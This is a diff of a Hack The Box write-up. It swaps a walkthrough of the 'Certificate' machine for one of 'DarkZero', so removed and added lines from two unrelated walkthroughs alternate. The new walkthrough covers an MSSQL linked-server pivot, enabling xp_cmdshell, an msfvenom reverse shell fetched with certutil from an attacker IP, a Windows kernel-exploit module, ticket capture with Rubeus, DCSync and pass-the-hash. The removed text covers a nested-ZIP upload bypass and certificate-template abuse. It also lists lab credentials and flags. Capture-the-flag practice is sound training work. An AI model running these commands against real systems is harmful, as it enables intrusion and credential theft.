@@ -1,25 +1,23 @@
-# Hack The Box — Certificate (Retired)
+# Hack The Box — DarkZero
 
-![picture1](picture1.png)
-
-- **Name:** Certificate
-- **Difficulty**: Hard
+![picture1](darkzero.png)
 
 ## Summary
 
-This <"write here">
+This document provides a detailed walkthrough for the Hack The Box machine DarkZero. This is a Hard-rated Windows machine that involves deep enumeration of Active Directory, pivoting through a linked MSSQL server, and multiple paths to privilege escalation.
+
+Initial Information
+The machine is part of an Active Directory environment. As stated in the machine information, we are provided with initial credentials to start our penetration test.
 
 ## Target
 
-- **IP**: 10.10.11.89
+- Machine IP: 10.10.11.89
 
-- **Hostname**: DC01.darkzero.htb
+- Domain: darkzero.htb
 
-- **Domain**: darkzero.htb 
+- Initial Credentials: john.w:RFulutONCOL!
 
-- **OS**: Microsoft Windows (Active Directory)
-
-- **Compromised User**: john.w/RFulUtONCOL!
+![picture1](picture1.png)
 
 ## Reconnaissance
 
@@ -100,361 +98,319 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Oct  9 14:49:01 2025 -- 1 IP address (1 host up) scanned in 108.48 seconds
 ```
-
 Port scan reveals:
-- **53**/tcp — domain — Simple DNS Plus (DNS service reported)
+- 88/464: Kerberos
+- 389/636/3268/3269: LDAP/GC
+- 445: SMB
+- 1433: Microsoft SQL Server 2022
 
-- **88**/tcp — kerberos-sec — Microsoft Windows Kerberos (server time: 2025-10-09 19:22:35Z)
+## Active Directory Enumeration with BloodHound
 
-- **135**/tcp — msrpc — Microsoft Windows RPC
+With the provided credentials, the first step is to enumerate the domain to understand its structure, users, computers, and potential attack vectors.
 
-- **139**/tcp — netbios-ssn — NetBIOS / SMB legacy
+To get a comprehensive view of the Active Directory environment, we use BloodHound. We run the Python collector with our credentials to gather data about users, groups, computers, and permissions.
 
-- **389**/tcp — ldap — Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
-
-- **445**/tcp — microsoft-ds — SMB (SMB signing enabled & required)
-
-- **464**/tcp — kpasswd5? — Kerberos password change
-
-- **593**/tcp — ncacn_http — MS RPC over HTTP (likely RPC endpoint mapper over HTTP)
-
-- **636**/tcp — ssl/ldap — LDAPS (cert CN = DC01.darkzero.htb, valid 2025-07-29 → 2026-07-29)
-
-- **1433**/tcp — ms-sql-s — Microsoft SQL Server 2022 (reported: Microsoft SQL Server 2022 RTM; Product_Version: 16.00.1000.00)
-
-- **2179**/tcp — vmrdp? (service fingerprint uncertain)
-
-- **3268**/tcp — ldap (Global Catalog) — AD Global Catalog (with same certificate CN)
-
-- **3269**/tcp — ssl/ldap (Global Catalog over SSL) — AD GC over SSL (same cert CN)
-
-## AD Enumeration
-
-The target serves a web application on port 80 that presents an online platform offering courses and certificates.
-
-![picture2](picture2.png)
-
-Now, to pentest the website we first need to register as a user.
-
-![picture3](picture3.png)
-
-![picture4](picture4.png)
-
-![picture5](picture5.png)
-
-We can now go through the functions in the website to find any vulnerabilities there is.
-
-![picture2](picture6.png)
-
-### Initial Foothold Access
-
-In the courses section, we found out that we can subscribe to any popular course and access the content of each course which are sessions videos and quizzes.
-
-![picture3](picture7.png)
-
-![picture4](picture8.png)
-
-![picture5](picture9.png)
-
-Clicking the quiz submit button direct us to a page where we can upload files into the website, soooo must be a Insecure File Upload vulnerability. Now we need to test this theory.
-
-![picture2](picture10.png)
-
-Accepted file type is only `pdf`, `docx`, `pptx` and `xlsx` and must be include in  the `zip` file. Also, reading the source script reveal the checking condition during the upload. 
-
-Condition: 
-1) If file type is not between the four mentioned earlier reject as `malicious file type`.
-
-2) If more than one file inside the zip file uploaded, reject the zip file.
-
-Ok reading https://benkyousec.github.io/posts/htb-certificate/, I found out that the application automatically extracted uploaded ZIP archives using WinRAR on the server; so by uploading a nested archive (double‑zipped) containing a malicious *.php file we bypassed client‑side/filetype checks and achieved remote code execution — this is commonly called a double‑loaded ZIP / nested archive bypass.
-
-```bash
- if ($fileExtension === 'zip') {
-    // Extract ZIP file contents
-    $zip = new ZipArchive();
-    if ($zip->open($fileTmpPath) === true) {
-        if ($zip->count() > 1) {
-            $message = "Please Include a single assignment file in the archive";
-            exit;
-        } else {
-            $innerFileName = $zip->getNameIndex(0);
-            if (!in_array(pathinfo($innerFileName, PATHINFO_EXTENSION), $allowedExtensions)) {
-                http_response_code(400);
-                echo "<h1>400 Bad Request</h1>";
-                echo "<p>The request you sent contains bad or malicious content(Invalid Extension).</p>";
-                exit;
-            }
-        }
-    echo exec('"C:\\Program Files\\WinRAR\\WinRAR.exe" x -y ' . $fileTmpPath . " " . $destinationDir);
-    $zip->close();
+```Bash
+bloodhound-python -u 'john.w' -p 'RFulutONCOL!' -d darkzero.htb -ns 10.10.11.89 --collectionmethod All --zip
 ```
 
-First, we want to know what happen when the website receive the file. Let's create a `test.pdf` and zip it inside an `a.zip` before uploading it inside the website.
+![picture1](picture2.png)
 
-![picture4](picture12.png)
+We then tried to upload the collected data is then ingested into the BloodHound GUI for analysis. But we failed as it says that it is partially complete.
 
-![picture5](picture13.png)
+![picture1](picture3.png)
 
-Now we know that the files uploaded will be save inside the website at `/static/uploads/<hash>/<filename>`.
 
-![picture2](picture14.png)
+## Active Directory Enumeration with Impacket
 
-Ok now we can create a `test.php` and zip it as `b.zip` and then we can double load it into a single zip file called `c.zip`.
+**1) Enumerate Domain Users with GetADUsers.py**
 
-```bash
-cat a.zip b.zip > c.zip
-```
-*sorry for wrong command in the picture*.
+This script queries the domain for a list of all user accounts. This is a fundamental step to understand who the users are in the domain and to build a potential target list.
 
-![picture3](picture15.png)
-
-Upload it into the website and we can click on the `HERE` button to access the file. But it will initially direct us to the pdf file first. We can now change the file into the php we created earlier.
-
-![picture4](picture16.png)
-
-![picture5](picture17.png)
-
-Let's go we can now execute the php file, with this we can move on to gain the foothold using reverse shell using `msfvenom`.
-
-![picture2](picture18.png)
-
-Let's go we now in the server as `xamppuser`.
-
-![picture3](picture19.png)
-
-### Gaining priviledge escalation through leaked credentials
-
-We used the command:
-
-```bash
-powershell -nop -exec bypass
+```Bash
+python3 GetADUsers.py 'darkzero.htb/john.w:RFulUtONCOL!' -dc-host DC01.darkzero.htb -dc-ip 10.10.11.89
 ```
 
-To open an interactive PowerShell prompt.
+![picture1](picture4.png)
 
-![picture4](picture20.png)
+**2) Enumerate Domain Computers with GetADComputers.py**
 
-We navigate through the directories and found interesting files in the `certificate.htb` directory. What attract me is a file called db.php, for those that doesn't know db means database in short. So sometimes this file is used to store `user's credentials`.
+This script lists all computer accounts joined to the domain. This helps us identify servers, workstations, and domain controllers, which are all potential targets for lateral movement.
 
-![picture5](picture21.png)
-
-Just as i thought, there is a mysql user credential for `certificate_webapp_user`.
-
-- Username: `certificate_webapp_user`
-- Password: `cert!f!c@teDBPWD`
-
-![picture2](picture22.png)
-
-Ok the challenge is that this shell is not stable because the shell keeps getting disconnected.
-
-*Read this write up to know more why the shell is being constantly rejected https://benkyousec.github.io/posts/htb-certificate/*.
-
-Doing some thinking got me to just write a php script to dump all the content of the server's mysql into a file and then download the file from the server into our machine.
-
-![picture3](picture23.png)
-
-![picture4](picture24.png)
-
-So, after reading the content of the sql, we came across a tables of user which stores the users full information including the password hash for each account. 
-
-![picture5](picture25.png)
-
-We can now copy all the hash into a `hashes.txt` file and found out what type of hash is being use here using `hashid`.
-
-![picture5](picture26.png)
-
-![picture5](picture27.png)
-
-Using `hashcat` we can now perform a dictionary-based cracking using `rockyou.txt` towards the hashes and save them in a pot file called `hashcat.pot`.
-
-![picture5](picture28.png)
-
-We successfully cracked 3 password from the database!
-
-![picture5](picture29.png)
-
-The most interesting one is the user `sara.b`.
-
-- Username: `sara.b`
-- Password: `Blink182`
-
-### Gaining priviledge escalation through misconfiguration in AD
-
-Now, to perform an analysis on the active directory ecosystem, using `sara.b`'s credential, we used `bloodhound-python` to gather all the information into a zip file and then we can upload it into the bloodhound GUI.
-
-![picture5](picture30.png)
-
-![picture5](picture31.png)
-
-Let's take a look on the group that `sara.b` belongs to, here it stated that she is part of `help desk` group which is also a member of the `Remote Desktop Users`. BINGO!! This means that we can perform an remote connection towards `sara.b` to access the internal server.
-
-![picture5](picture32.png)
-
-![picture5](picture33.png)
-
-We used `evil-winrm` to do the job...
-
-![picture5](picture34.png)
-
-Inside we dicover something in the `Documents` directory, a folder called `WS-01` and inside is 2 files called `Description.txt` and `WS-01_PktMon.pcap`
-
-Reading the txt file reveals a clue regarding a sign in process which stated that when a user enter a bad password it returns `bad credentials error`. But eventhough the user enter, the server will crash and freeze! Something not right here and they gave us a pcap file??? I assumed it must be the captured process during the sign in as prove to the statement before.
-
-![picture5](picture35.png)
-
-Because we in a remote connection, we can use the command `download` to download the pcap file into our machine.
-
-![picture5](picture36.png)
-
-Reading the file we saw some traces of authentication token inside the network packets, it will take forever to extract them. So luckily i found the perfect tool to extract them for me. https://github.com/jalvarezz13/Krb5RoastParser
-
-![picture5](picture37.png)
-
-Krb5RoastParser can extract all the 3 types of the authentication token (`as_req`, `as_rep`, and `tgs_rep`). Let's extract them all.
-
-![picture5](picture38.png)
-
-Using `hashcat` again i cracked the `as_req` hash and gained the second credentials to escalate our priviledge on the server.
-
-- Username: `Lion.SK`
-- Password: `!QA22wsx`
-
-![picture5](picture39.png)
-
-We used the same method with `sara.b` and viewed the groups `Lion.SK` belongs to. We save this for later use.
-
-![picture5](picture40.png)
-
-Now that we know he is also the group member of `Remote Desktop Users`, we try to create a remote connection to the server using his credentials.
-
-VOILA!! we gain the `User.txt` flag.
-
-![picture5](picture41.png)
-
-**User Flag:** `f0151905d129b8bf24e96daf8ca8c892`
-
-### Root Priviledge Escalation
-
-We now can check for potentials vulnerable certificates that `Lion.SK` can enroll using `certipy-ad` .
-
-```bash
-certipy-ad find -u 'user@domain.local' -p 'Password123!' -dc-ip <TARGET> -vulnerable
+```Bash
+python3 GetADComputers.py 'darkzero.htb/john.w:RFulUtONCOL!' -dc-host DC01.darkzero.htb -dc-ip 10.10.11.89
 ```
 
-![picture5](picture42.png)
+![picture1](picture5.png)
 
-checking the created `Certipy.txt` file reveals use that `Lion.SK` is vulnerable to ESC3!
+**3) Check for Kerberoastable Users with GetUserSPNs.py**
 
-![picture5](picture43.png)
+This tool attempts the "Kerberoasting" attack. It queries the domain for user accounts that have a Service Principal Name (SPN) set. If found, it requests a Kerberos service ticket (TGS) for that service, which can be cracked offline to recover the user's password hash. The output "No entries found!" indicates that no users are vulnerable to this attack.
 
-We read the vulnerability in the github article 
-https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation.
-
-![picture5](picture44.png)
-
-**So what ESC3 vulnerability is actually**: We (as an attacker) can request a user's certificate on their behalf using an Enrollment Agent certificate, allowing the us to impersonate that user.
-
-![picture5](picture45.png)
-
-First we must request for our user certificate using `EnrollAgent` *or any template will do*.
-
-![picture5](picture47.png)
-
-Here i used the template `Delegated-CRA` to request for the certificate.
-
-![picture5](picture46.png)
-
-Then i tried to request a certificate on behalf of Administrator.
-
-```bash
-certipy req \
-    -u Lion.SK@certificate.htb -p '!QAZ2wsx' \
-    -dc-ip 10.10.11.71 -target 'DC01.certificate.htb' \
-    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
-    -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\Administrator'
+```Bash
+python3 GetUserSPNs.py 'darkzero.htb/john.w:RFulUtONCOL!' -dc-host DC01.darkzero.htb -dc-ip 10.10.11.89 -request -outfile kerberoast.hash -k
 ```
 
-But failed....
+![picture1](picture6.png)
 
-```bash
-Certipy v5.0.3 - by Oliver Lyak (ly4k)
+**4) Check for AS-REP Roastable Users with GetNPUsers.py**
 
-[*] Requesting certificate via RPC
-[*] Request ID is 23
-[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
+This tool attempts the "AS-REP Roasting" attack. It identifies users who have Kerberos pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH). For such users, an attacker can request a piece of encrypted data (an AS-REP) that can be cracked offline to reveal the user's password, without needing any prior credentials for that user. The output shows that our user john.w does not have this setting enabled, so this vector is not available.
+
+```Bash
+python3 GetNPUsers.py darkzero.htb/ -dc-ip 10.10.11.89 -usersfile user.txt
 ```
 
-This is because the Administrator did not have the email setup for them, that is what caused the error.
+![picture1](picture7.png)
 
-### Finding alternate way to gain Administrator access
+## SMB Enumeration
+We check for accessible SMB shares using crackmapexec and smbmap. This reveals that our user john.w has read access to the SYSVOL and NETLOGON shares.
 
-Using `GetADUsers.py` from `impacket-tools`, we scanned the Active Directory (AD) for users that have the email setup for them so that we can request the certificate on their behalf and gained the access to impersonate them.
+```Bash
 
-![picture5](picture48.png)
+crackmapexec smb 10.10.11.89 -d darkzero.htb -u "john.w" -p 'RFulutONCOL!'
+smbmap -H 10.10.11.89 -d darkzero.htb -u "john.w" -p 'RFulutONCOL!'
+We can explore these shares using smbclient. While we can browse the directories, no sensitive files were immediately found.
+```
 
-We go back to `bloodhound` and look through the groups where the users belongs to and the result is that `ryan.k` is in a group called `Domain Storage Managers` which from the description is the `security group that responsible for volume-level tasks inside the server`. Seems like a high priviledge group to me.
+![picture1](picture8.png)
 
-![picture5](picture49.png)
+We proceed to connect to the SYSVOL share using smbclient to look for sensitive information like scripts or Group Policy Preferences (GPP) files which can sometimes contain passwords.
 
-![picture5](picture50.png)
+```Bash
+smbclient //10.10.11.89/SYSVOL -U 'darkzero.htb/john.w'
+```
 
-Let's request the certificate as `ryan.k` and auth as him using `certipy-ad` to get his NT hash to create a remote connection to the server impersonating him.
+![picture1](picture9.png)
 
-![picture5](picture51.png)
+After exploring the directories within the share, we found nothing of immediate interest that could be used for exploitation.
 
-![picture5](picture52.png)
+## Initial Foothold via MSSQL
 
-![picture5](picture53.png)
+Our nmap scan highlighted an open MSSQL port (1433). Since direct AD attacks were unfruitful, we investigate this service. We can connect to it using our domain credentials with mssqlclient.py.
 
-Going through all the directories inside the server as ryan.k did not give us anything useful for priviledge escalation. Then i remember about the `Store Manager Group` with the volume-level task.
+```Bash
+mssqlclient.py darkzero.htb/john.w:'RFulutONCOL!'@10.10.11.89 -windows-auth
+```
 
-Let's view the priviledge of this user.. Owhhh a `SeManageVolumePrivilege`?
+![picture1](picture10.png)
 
-![picture5](picture54.png)
+### MSSQL Enumeration
 
-Searching through github gave me a git page on `SeManageVolumeExploit`. Giving us a script to run on the victim server to escalate priviledge (Giving us the full permission on the C:/ drive).
+Once connected, we begin enumerating the database. We check our current user privileges and find that we are not a sysadmin on this instance (DC01).
 
-![picture5](picture55.png)
+```SQL
+SELECT SUSER_SNAME() AS LoginName;
+SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin;
+```
 
-I kinda hate using c exploit and luckily, the git provides with the exe file exploit too.
+![picture1](picture13.png)
 
-![picture5](picture56.png)
+We list the available databases and tables but don't find anything immediately useful in the master, tempdb, or msdb databases.
 
-downloading the exe file into my machine and uploading and executing the exploit inside the server **WORKS!!**
+![picture1](picture11.png)
 
-![picture5](picture57.png)
+![picture1](picture12.png)
 
-We can now access the Administrator Directory, but unfortunately we cannot directly access the file as the challenge creator decide to make an `UnauthorizedAccessException` to `Lion.SK`. BROO COMEONNNN!!!!
+### Pivoting Through a Linked Server
 
-![picture5](picture58.png)
+A crucial discovery is made when we enumerate linked servers using the sp_linkedservers stored procedure. We find a link to another server: DC02.darkzero.ext.
 
-Based on this write up https://benkyousec.github.io/posts/htb-certificate/, we can use `certutil` to export CA's private keys to use as a forging token to impersonate the Administrator.
+```SQL
+EXEC sp_linkedservers;
+```
 
-![picture5](picture59.png)
+![picture1](picture14.png)
 
-We saved the CA private key as a pfx file and download it into our machine.
+We can execute queries on this linked server. We attempt to list its databases.
 
-![picture5](picture60.png)
+```SQL
+use_link [DC02.darkzero.ext]
+select name from sys.databases;
+```
 
-![picture5](picture61.png)
+![picture1](picture15.png)
 
-Using `certipy-ad` we can now forge the ca private key onto the `Administrator`.
+Most importantly, we check our privileges on this linked server. The query reveals that our context on DC02 is dc01_sql_svc, which is a member of the sysadmin role.
 
-![picture5](picture62.png)
+```SQL
+SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin;
+SELECT SUSER_SNAME() AS LoginName;
+```
 
-and then auth as the `Administrator` to get the TGT hash/ NT hash for `Administrator`.
+![picture1](picture16.png)
 
-![picture5](picture63.png)
+With sysadmin rights, we can enable xp_cmdshell to execute commands on the DC02 server.
 
-Using the hash, we can now create a remote connection as the `Administrator` into the server and read the `root.txt`.
+```SQL
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
+```
+![picture1](picture19.png)
 
-![picture5](picture64.png)
+We verify that xp_cmdshell works by running `sc qc MSSQLSERVER`. The command executes successfully and reveals the service account name.
+
+![picture1](picture17.png)
+
+### Gaining a Shell
+
+Steps in order to gain foothold:
+
+Now that we have command execution, we can get a reverse shell. We Generate a Windows Meterpreter reverse TCP payload with msfvenom.
+
+```Bash
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.110 LPORT=4444 -f exe -o rev_x64.exe
+Host Payload: Start a Python HTTP server to serve the payload.
+```
+
+![picture1](picture20.png)
+
+Now we use python to host the directory into a server.
+
+```Bash
+python3 -m http.server 80
+```
+
+We then use xp_cmdshell to download the payload to the C:\Windows\Temp directory on DC02 and then execute it.
+
+```SQL
+EXEC ('xp_cmdshell ''certutil -urlcache -f http://10.10.14.110/rev_x64.exe C:\Windows\Temp\rev_x64.exe''') AT [DC02.darkzero.ext];
+EXEC ('xp_cmdshell ''C:\Windows\Temp\rev_x64.exe''') AT [DC02.darkzero.ext];
+```
+
+![picture1](picture21.png)
+
+**Catch Shell:**
+A Metasploit multi/handler catches the connection, giving us a Meterpreter session on DC02.
+
+## Privilege Escalation to USER SYSTEM (User Flag)
+
+We now have a shell on DC02. The next step is to escalate privileges to SYSTEM.
+
+### Kernel Exploit
+First, we check our current privileges with whoami /priv.
+
+![picture1](picture25.png)
+
+Not much priviledge on our user's account.
+
+### Vulnerabilities Analyzing using Winpeas.exe
+
+To analyze vulnerability for potential priviledge escalation we then perform enumeration on the compromised machine. We download and run winPEAS.
+
+```PowerShell
+certutil -urlcache -f http://10.10.14.110/winPEAS.exe C:\Users\Public\Downloads\winPEAS.exe
+```
+
+![picture1](picture23.png)
+
+The systeminfo command (or winPEAS output) shows the OS is Windows Server 2022 Datacenter.
+
+![picture1](picture24.png)
+
+We search Metasploit for local privilege escalation exploits for Windows Server 2022.
+
+```Bash
+search windows 2022
+```
+
+![picture1](picture26.png)
+
+The exploit `exploit/windows/local/cve_2024_30088_authz_basep` looks 
+promising. We background our current session, load the exploit, set the SESSION option, and run it.
+
+
+```Bash
+use exploit/windows/local/cve_2024_30088_authz_basep
+set SESSION 4
+run
+```
+
+![picture1](picture27.png)
+
+The exploit succeeds, and we get a new Meterpreter session running as NT AUTHORITY\SYSTEM.
+
+![picture1](picture28.png)
+
+We can now read the user.txt flag inside the Administrator Desktop.
+
+**User Flag:** `0c13666c2d8ca9234e79be86d5e6bd3a`
+
+![picture1](picture29.png)
+
+However, I couldn't find the Root Flag anywhere. So I remember earlier that this server has 2 DC, so i suspect that the Root Flag is located on the administrator's desktop of the Domain Controller (DC01). We need to pivot.
+
+### Kerberos Abuse (Pass-the-Ticket)
+
+This is the intended and more complex path to full domain compromise.
+
+**Coerce Authentication:**
+From our initial MSSQL shell on DC01, we can use xp_dirtree to make DC02 attempt to authenticate to our machine over SMB. This step is a common technique in Active Directory (AD).
+
+![picture1](picture30.png)
+
+**Monitor for Tickets:** 
+On DC01 (pivoting from DC02), we upload and run Rubeus.exe to monitor for new Kerberos Ticket Granting Tickets (TGTs). We managed to captured a TGT for the `DC01$` machine account.
+
+![picture1](picture31.png)
+
+**Extract and Convert Ticket:** 
+We then copy the Base64-encoded ticket, decode it, and save it as a `.kirbi` file.
+
+```Bash
+base64 -d file.b64 > dc01.kirbi
+```
+
+![picture1](picture34.png)
+
+Then, we convert the .kirbi file to the .ccache format required by Impacket scripts.
+
+```Bash
+ticketConverter.py dc01.kirbi dc01.ccache
+```
+
+![picture1](picture35.png)
+
+### Pass-the-Ticket & Dump Hashes
+
+We set the KRB5CCNAME environment variable to point to our ticket file. With this ticket, we impersonate the DC01$ machine account and use secretsdump.py to perform a DCSync attack and dump all the password hashes from the domain.
+
+```Bash
+export KRB5CCNAME=$(pwd)/dc01.ccache
+secretsdump.py -k -no-pass -just-dc-user darkzero/administrator darkzero.htb
+```
+
+![picture1](picture36.png)
+
+![picture1](picture37.png)
+
+### Pass-the-Hash to SYSTEM 
+
+We now have the NTLM hash for the darkzero\Administrator account. We can use this hash with psexec.py to gain a SYSTEM-level shell on the domain controller DC01.
+
+```Bash
+psexec.py -hashes <ADMIN_HASH> darkzero.htb/Administrator@10.10.11.89
+```
+
+![picture1](picture38.png)
+
+Now, with full control over the Domain Controller, we can easily retrieve the Root Flag.
+
+```PowerShell
+# Get root flag
+type C:\Users\Administrator\Desktop\root.txt
+```
+![picture1](picture39.png)
+
+**Root Flag:** `ea717cc87cd2e5970eae400c38a17856`
 
 ## PWNED
 
-![picture5](picture65.png)
+![picture1](picture40.png)
+
+## Conclusion
+The machine has been successfully compromised, and both flags have been captured.
 
 ---
 *This writeup is for educational purposes only. Always ensure you have proper authorization before testing security vulnerabilities.*
-
